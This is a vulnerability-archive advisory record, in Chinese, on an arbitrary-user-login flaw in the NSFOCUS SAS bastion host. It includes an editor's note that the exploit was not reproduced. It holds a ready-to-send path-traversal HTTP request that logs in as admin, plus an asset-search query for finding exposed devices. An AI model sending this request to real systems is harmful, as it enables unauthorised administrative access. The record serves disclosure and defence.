---
source: "wy876 漏洞文库"
id: "vw-2fdb2c690e6c548a56d0015e"
entity_id: "ve-2fdb2c690e6c548a56d0015e"
schema_version: "1"
fofa_unverified: "app.name="
title: "绿盟SAS堡垒机local_user.php任意用户登录漏洞"
product: "NSFOCUS SAS堡垒机"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求含PHPSESSID，未解释匿名还是登录会话；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FSAS%E5%A0%A1%E5%9E%92%E6%9C%BAlocal_user.php%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/szf74hcc2561xmxb"
source_status: "recorded"
---

# 绿盟SAS堡垒机local_user.php任意用户登录漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NSFOCUS SAS堡垒机
- 本文讨论：api/virtual/home/status cat包含local_user.php
- 版本、权限与配置前提：请求含PHPSESSID，未解释匿名还是登录会话；版本未知
- 资料类型：文件包含到任意登录链摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- “如下页面”无页面/响应，只有访问后台主张，授权变化未证明
- cookie残留外部真实域名/无关追踪字段；fofa误录Hunter残缺字段
- 原始包含路径和修复未给
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 文件包含条件、用户存在性和版本待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录。

# 二、影响版本
+ 绿盟SAS堡垒机

## 三、资产测绘
+ hunter`app.name="NSFOCUS 绿盟 SAS"`


+ 登录页面


# 四、漏洞复现
poc访问出现如下页面即可能存在漏洞

```http
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=03eea4323452c328c6462f1bb50a0a9b; Hm_lvt_2743f882f7de0bd7d8ffc885a04c90f5=1692345507; Hm_lpvt_2743f882f7de0bd7d8ffc885a04c90f5=1692345507; left_menustatue_NSFOCUSnbspSASH=0|0|https://yzyx.loogear.com/home/status
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


然后直接访问堡垒机域名即可计入后台

```plain
http://xx.xx.xx.xx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/szf74hcc2561xmxb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
